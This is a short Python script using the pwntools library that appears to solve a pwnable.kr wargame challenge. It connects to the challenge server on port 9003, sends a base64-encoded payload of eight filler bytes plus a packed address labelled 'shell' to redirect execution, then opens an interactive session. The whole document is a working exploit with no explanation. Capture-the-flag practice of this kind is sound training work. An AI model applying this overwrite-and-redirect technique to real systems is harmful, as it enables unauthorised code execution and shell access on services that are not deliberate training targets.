from pwn import *
import base64

p = remote("pwnable.kr", 9003)

shell = 0x08049278

payload = base64.b64encode("a" * 8 + p32(shell))

p.sendline(payload)
p.interactive()
